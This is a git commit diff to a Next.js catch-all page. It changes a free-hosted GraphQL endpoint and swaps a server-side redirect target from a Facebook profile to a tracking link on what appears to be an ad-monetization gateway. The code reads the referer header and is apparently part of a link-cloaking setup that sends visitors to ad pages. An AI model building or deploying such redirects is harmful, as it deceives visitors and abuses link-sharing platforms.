9b71b8440803d82cb0e92bc36a9432e2eb21e21c
ManjuDevi41 <133944831+ManjuDevi41@users.noreply.github.com>
2023-05-22 17:10:28 +0530

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://manju41.000webhostapp.com/graphql"
+	const endpoint = "https://polygynous-ratios.000webhostapp.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://www.facebook.com/Manju.Rawani.79?mibextid=ZbWKwL` 
+					`https://www.highrevenuegate.com/t5av3by0?key=69f0e066b475879bda4b040449c8576a` 
 				}`,
 			},
 		};
